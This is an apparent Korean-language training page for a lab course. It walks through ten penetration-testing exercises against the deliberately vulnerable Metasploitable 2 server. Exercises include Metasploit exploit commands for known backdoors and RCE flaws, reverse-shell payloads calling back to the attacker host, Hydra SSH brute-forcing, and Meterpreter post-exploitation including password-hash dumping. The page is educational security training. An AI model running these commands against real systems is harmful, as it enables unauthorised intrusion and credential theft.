@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="ko" class="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>5강. 메타스플로이터블 2 취약점 진단 및 실습</title>
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+        body { 
+            font-family: 'Noto Sans KR', sans-serif; 
+            background-color: #020617; 
+            color: #f8fafc; 
+            margin: 0; padding: 0;
+            line-height: 1.8;
+        }
+        .terminal-bg { background-color: #0c1120; border: 1px solid #1e293b; }
+        .text-glow { text-shadow: 0 0 10px rgba(34, 211, 238, 0.4); }
+        .section-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(51, 65, 85, 0.5); backdrop-filter: blur(16px); }
+        .code-block { font-family: 'Fira Code', monospace; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #0ea5e9; }
+        
+        .footnote { font-size: 0.75rem; color: #94a3b8; margin-top: 0.5rem; font-style: italic; }
+        .command-text { color: #22d3ee; font-weight: 700; font-family: 'Fira Code', monospace; }
+        .step-badge { background: #0ea5e9; color: #020617; font-weight: 900; padding: 2px 8px; border-radius: 4px; font-size: 10px; }
+    </style>
+</head>
+<body class="antialiased pb-20">
+
+    <!-- Header -->
+    <header class="border-b border-slate-800 bg-slate-900/50 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto px-6 py-8 flex justify-between items-center">
+            <div>
+                <div class="flex items-center gap-2 mb-2">
+                    <span class="bg-cyan-500 text-slate-900 px-2 py-0.5 text-[10px] font-black uppercase tracking-widest rounded-sm shadow-[0_0_10px_rgba(34,211,238,0.5)]">Cyber Security Lab</span>
+                    <span class="text-slate-500 font-mono text-[10px]">COURSE-05 | Penetration Testing Lab</span>
+                </div>
+                <h1 class="text-4xl font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 via-blue-500 to-indigo-500 tracking-tight leading-tight">
+                    메타스플로이터블 2 취약점 진단<br>
+                    <span class="text-slate-100 text-2xl font-bold">Kali Linux를 활용한 모의 침투 실습 (10 Case Study)</span>
+                </h1>
+            </div>
+            <div class="text-right hidden md:block border-l border-slate-800 pl-6">
+                <div class="bg-green-500/10 text-green-400 border border-green-500/20 px-4 py-2 rounded-xl text-sm font-black font-mono shadow-lg uppercase">
+                    Lab Ready
+                </div>
+                <p class="text-[10px] text-slate-500 mt-2 tracking-widest uppercase">Offensive Security Expert</p>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-6xl mx-auto px-6 py-16 space-y-24">
+
+        <!-- Section 1: Lab Architecture -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                1. 실습 환경 아키텍처 (Lab Architecture)
+            </h2>
+            <div class="section-card rounded-3xl p-10 shadow-2xl">
+                <p class="text-slate-300 text-lg mb-10 leading-relaxed">
+                    본 실습은 **Kali Linux (공격자)**와 **Metasploitable 2 (대상자)** 간의 가상 네트워크 환경에서 진행됩니다. 모든 공격 시나리오는 실제 서버에서 발생할 수 있는 취약한 서비스 설정을 바탕으로 하며, **RCE (Remote Code Execution, 원격 코드 실행)** 권한 획득을 최종 목표로 합니다.
+                </p>
+
+                <div class="bg-slate-900/80 border border-slate-800 rounded-2xl p-8 shadow-inner">
+                    <h4 class="text-center font-bold text-slate-400 mb-8 text-xs tracking-widest uppercase">
+                        [도식: 모의 침투 실습 네트워크 구성도]
+                    </h4>
+                    <div class="flex flex-col md:flex-row items-center justify-around gap-8">
+                        <!-- Attacker -->
+                        <div class="text-center p-6 bg-slate-800 rounded-xl border border-cyan-500/30 w-full max-w-[250px]">
+                            <i data-lucide="skull" class="w-12 h-12 text-cyan-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100">Kali Linux</div>
+                            <div class="text-[10px] text-slate-500 font-mono mt-2">IP: 192.168.x.101</div>
+                            <div class="mt-2 text-[10px] bg-cyan-900/50 text-cyan-400 py-1 rounded tracking-tighter uppercase font-bold">Attacker Node</div>
+                        </div>
+
+                        <div class="flex flex-col items-center">
+                            <i data-lucide="zap" class="w-8 h-8 text-yellow-500 animate-pulse"></i>
+                            <div class="text-[10px] text-slate-600 font-black mt-2">PRIVATE LAN</div>
+                        </div>
+
+                        <!-- Victim -->
+                        <div class="text-center p-6 bg-slate-800 rounded-xl border border-red-500/30 w-full max-w-[250px]">
+                            <i data-lucide="server" class="w-12 h-12 text-red-400 mx-auto mb-4"></i>
+                            <div class="font-black text-slate-100">Metasploitable 2</div>
+                            <div class="text-[10px] text-slate-500 font-mono mt-2">IP: 192.168.x.128</div>
+                            <div class="mt-2 text-[10px] bg-red-900/50 text-red-400 py-1 rounded tracking-tighter uppercase font-bold">Victim Node</div>
+                        </div>
+                    </div>
+                </div>
+                <p class="footnote">* 실습 전 `ifconfig` 명령어로 각 장비의 IP 주소를 반드시 확인하십시오.</p>
+            </div>
+        </section>
+
+        <!-- Section 2: 10 Practical Exercises -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                2. 실습 예제 리스트 (10 Practical Exercises)
+            </h2>
+            
+            <div class="space-y-12">
+
+                <!-- Case 01: Information Gathering -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 01</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">정보 수집: 서비스 포트 스캐닝 (Nmap)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400 leading-relaxed">
+                            공격 전 대상 서버에서 동작 중인 서비스와 버전 정보를 파악하는 과정입니다. **Nmap (Network Mapper, 네트워크 매퍼)**을 사용하여 모든 포트의 상세 정보를 수집합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm border-slate-800">
+                            <div class="text-slate-500 mb-2"># 상세 버전 정보와 운영체제 확인</div>
+                            <div class="text-slate-100">$ <span class="command-text">nmap -sV -O 192.168.x.128</span></div>
+                        </div>
+                        <p class="footnote">* -sV: 서비스 버전 감지, -O: 운영체제 감지</p>
+                    </div>
+                </div>
+
+                <!-- Case 02: VSFTPD Backdoor -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl border-l-4 border-red-500">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 02</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">VSFTPD 2.3.4 백도어 익스플로잇 (Backdoor)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            특정 버전의 VSFTPD 서버에 포함된 웃는 얼굴(`:)`) 트리거 백도어를 이용한 공격입니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs border-slate-800">
+                            <div class="text-cyan-400">msfconsole</div>
+                            <div class="text-slate-300">use <span class="text-yellow-400">exploit/unix/ftp/vsftpd_234_backdoor</span></div>
+                            <div class="text-slate-300">set RHOSTS 192.168.x.128</div>
+                            <div class="text-slate-300">exploit</div>
+                        </div>
+                        <p class="text-[10px] text-red-400 font-bold uppercase mt-2">결과: Root 쉘 획득 성공 (Whoami 실행 시 root 확인)</p>
+                    </div>
+                </div>
+
+                <!-- Case 03: UnrealIRCD Backdoor -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl border-l-4 border-red-500">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 03</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">UnrealIRCD 3.2.8.1 백도어 공격 (IRC 인가 취약점)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            IRC 서버 소프트웨어의 취약한 소스코드를 이용해 원격에서 시스템 권한을 탈취합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs border-slate-800">
+                            <div class="text-cyan-400">msfconsole</div>
+                            <div class="text-slate-300">use <span class="text-yellow-400">exploit/unix/irc/unreal_ircd_3281_backdoor</span></div>
+                            <div class="text-slate-300">set RHOSTS 192.168.x.128</div>
+                            <div class="text-slate-300">set PAYLOAD cmd/unix/reverse</div>
+                            <div class="text-slate-300">set LHOST [Kali_IP]</div>
+                            <div class="text-slate-300">exploit</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Case 04: Samba Usermap Script -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl border-l-4 border-red-500">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 04</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">Samba Usermap Script (RCE)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            Samba 서버의 설정 결함을 이용해 인증 없이 원격에서 명령어를 실행하는 가장 강력한 공격 중 하나입니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs border-slate-800">
+                            <div class="text-cyan-400">msfconsole</div>
+                            <div class="text-slate-300">use <span class="text-yellow-400">exploit/multi/samba/usermap_script</span></div>
+                            <div class="text-slate-300">set RHOSTS 192.168.x.128</div>
+                            <div class="text-slate-300">exploit</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Case 05: Java RMI Server Exploit -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl border-l-4 border-red-500">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 05</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">Java RMI Registry 취약점 실습 (Remote Method Invocation)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            Java RMI(Remote Method Invocation, 원격 메소드 호출) 서비스의 기본 설정을 이용해 임의의 클래스를 로드하여 명령을 실행합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs border-slate-800">
+                            <div class="text-cyan-400">msfconsole</div>
+                            <div class="text-slate-300">use <span class="text-yellow-400">exploit/multi/misc/java_rmi_server</span></div>
+                            <div class="text-slate-300">set RHOSTS 192.168.x.128</div>
+                            <div class="text-slate-300">exploit</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Case 06: PHP CGI RCE -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl border-l-4 border-red-500">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 06</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">PHP CGI 파라미터 삽입 공격 (CVE-2012-1823)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            PHP CGI 모드에서 질의 문자열(Query String)을 잘못 처리하여 발생하는 RCE(원격 코드 실행) 취약점입니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs border-slate-800">
+                            <div class="text-cyan-400">msfconsole</div>
+                            <div class="text-slate-300">use <span class="text-yellow-400">exploit/multi/http/php_cgi_arg_injection</span></div>
+                            <div class="text-slate-300">set RHOSTS 192.168.x.128</div>
+                            <div class="text-slate-300">exploit</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Case 07: Distcc Daemon Exploit -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl border-l-4 border-red-500">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 07</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">Distcc 데몬 원격 명령 실행 공격 (Distributed Compiler)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            분산 컴파일러 서비스인 Distcc의 취약한 보안 설정을 악용하여 시스템 명령어를 전송합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs border-slate-800">
+                            <div class="text-cyan-400">msfconsole</div>
+                            <div class="text-slate-300">use <span class="text-yellow-400">exploit/unix/misc/distcc_exec</span></div>
+                            <div class="text-slate-300">set RHOSTS 192.168.x.128</div>
+                            <div class="text-slate-300">set PAYLOAD cmd/unix/reverse</div>
+                            <div class="text-slate-300">set LHOST [Kali_IP]</div>
+                            <div class="text-slate-300">exploit</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Case 08: SSH Brute Forcing -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 08</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">SSH 무차별 대입 공격 (Brute Force via Hydra)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            **Hydra (하이드라)** 도구를 사용하여 취약한 계정 정보를 무차별 대입 방식으로 찾아냅니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm border-slate-800">
+                            <div class="text-slate-100">$ <span class="command-text">hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.128</span></div>
+                        </div>
+                        <p class="footnote">* 메타스플로이터블 2 기본 계정: msfadmin / msfadmin</p>
+                    </div>
+                </div>
+
+                <!-- Case 09: Telnet Information Gathering -->
+                <div class="section-card rounded-3xl p-8 border-slate-800 shadow-xl">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 09</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">Telnet 배너 그래빙 및 접근 (Banner Grabbing)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400">
+                            암호화되지 않은 프로토콜인 Telnet을 통해 서버의 배너 정보를 확인하고 접근을 시도합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-sm border-slate-800">
+                            <div class="text-slate-100">$ <span class="command-text">telnet 192.168.x.128</span></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Case 10: Post-Exploitation -->
+                <div class="section-card rounded-3xl p-8 border-indigo-900/30 shadow-xl border-l-4 border-indigo-500">
+                    <div class="flex items-center gap-4 mb-6">
+                        <span class="step-badge">EXERCISE 10</span>
+                        <h3 class="text-xl font-bold text-slate-100 italic">침투 후 활동: 시스템 정보 수집 (Post-Exploitation)</h3>
+                    </div>
+                    <div class="pl-4 space-y-4">
+                        <p class="text-sm text-slate-400 leading-relaxed">
+                            공격 성공 후 **Meterpreter (미터프리터)** 세션을 통해 대상 시스템의 내부 정보를 수집하고 지속성(Persistence)을 확보합니다.
+                        </p>
+                        <div class="terminal-bg rounded-xl p-6 font-mono text-xs border-slate-800">
+                            <div class="text-cyan-400">meterpreter ></div>
+                            <div class="text-slate-300">getuid <span class="text-slate-500"># 현재 사용자 권한 확인</span></div>
+                            <div class="text-slate-300">sysinfo <span class="text-slate-500"># 시스템 사양 확인</span></div>
+                            <div class="text-slate-300">hashdump <span class="text-slate-500"># 사용자 비밀번호 해시 추출</span></div>
+                            <div class="text-slate-300">shell <span class="text-slate-500"># 일반 운영체제 쉘로 전환</span></div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- Expert Insight -->
+        <section>
+            <h2 class="text-2xl font-black border-l-4 border-cyan-500 pl-4 text-slate-100 mb-8 tracking-tight uppercase">
+                3. 아키텍트 인사이트 (Architect Insight)
+            </h2>
+            <div class="bg-slate-900/40 border border-slate-800 rounded-3xl p-10 shadow-2xl space-y-10">
+                <div class="flex flex-col md:flex-row gap-8">
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                        <div class="text-cyan-400 mb-4"><i data-lucide="lightbulb" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">Payload (페이로드)의 중요성</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            익스플로잇은 단순히 취약점을 공격하는 행위이지만, <strong>페이로드(Payload)</strong>는 공격 성공 후 실행될 실제 코드입니다. <strong>Reverse Shell (리버스 쉘)</strong> 방식을 사용하여 대상 서버가 공격자에게 접속하게 함으로써 방화벽(Firewall)의 Inbound 정책을 우회할 수 있습니다.
+                        </p>
+                    </div>
+                    <div class="flex-1 bg-slate-800/50 p-6 rounded-2xl border border-slate-700">
+                        <div class="text-red-400 mb-4"><i data-lucide="shield-alert" class="w-8 h-8"></i></div>
+                        <h4 class="font-bold text-slate-100 mb-2">방어적 관점 (Defensive View)</h4>
+                        <p class="text-xs text-slate-400 leading-relaxed">
+                            메타스플로이터블 2는 고의적으로 취약하게 설정된 서버입니다. 실무 서버에서는 사용하지 않는 서비스(IRC, FTP 등)를 비활성화하고, 모든 패치를 최신으로 유지하며, <strong>WAF (Web Application Firewall, 웹 방화벽)</strong> 및 <strong>IDS/IPS (침입 탐지/차단 시스템)</strong>를 통해 비정상적인 트래픽을 차단해야 합니다.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <footer class="max-w-6xl mx-auto px-6 py-12 border-t border-slate-800 text-center">
+        <div class="text-slate-500 font-mono text-[10px] tracking-widest uppercase mb-4">
+            © 2026 Cyber Security Education Lab.
+        </div>
+        <p class="text-slate-600 text-[10px] leading-relaxed max-w-2xl mx-auto italic uppercase">
+            * 법적 고지: 본 실습 예제는 승인된 교육 환경(Virtual Lab)에서만 실행되어야 하며, 불법적인 용도로 사용될 경우 모든 책임은 사용자에게 있습니다.
+        </p>
+        <div class="mt-8">
+            <span class="inline-block px-4 py-1 bg-slate-900 border border-slate-800 rounded-full text-[10px] text-cyan-500 font-black tracking-widest">
+                Next Step: 6강. 모의해킹 보고서 작성 및 대응 방안 수립
+            </span>
+        </div>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+</html>
